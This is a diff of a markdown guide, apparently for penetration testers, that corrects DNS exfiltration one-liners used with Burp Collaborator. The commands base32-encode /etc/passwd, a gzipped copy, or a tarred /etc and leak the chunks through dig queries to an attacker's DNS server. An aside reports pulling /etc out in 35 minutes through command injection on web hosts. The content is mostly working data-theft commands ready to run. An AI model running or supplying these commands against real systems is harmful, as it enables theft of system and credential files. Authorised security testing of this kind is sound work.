@@ -40,7 +40,7 @@ In the examples below: `<DNS Name>` is the random name provided by Burp Collabor
 ### Exfiltrate a file:
 
 ```
-base32 -w 63 < /etc/passwd | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
+base32 -w 63 < /etc/passwd | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Name>.<DNS Server>; done;
 ```
 
 Decode the file:
@@ -52,7 +52,7 @@ Decode the file:
 ### Exfiltrate a compressed file:
 
 ```
-gzip - < /etc/passwd | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
+gzip - < /etc/passwd | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Name>.<DNS Server>; done;
 ```
 
 Decode/unzip the file:
@@ -66,7 +66,7 @@ Decode/unzip the file:
 Note that exfiltrating /etc on an Ubuntu Linux system worked (but was slow). It took 35 minutes, requiring 45,382 DNS requests, resulting in a 1.8 megabyte tar.gz file. Needless to say: the files/directories contained in the archive are restricted by the permissions of the running user. For command injection on web sites (using an account such as apache or www-data), many files/directories will likely be missing.
 
 ```
-tar czf - /etc | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
+tar czf - /etc | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Name>.<DNS Server>; done;
 ```
 
 Decode/save the tar archive:
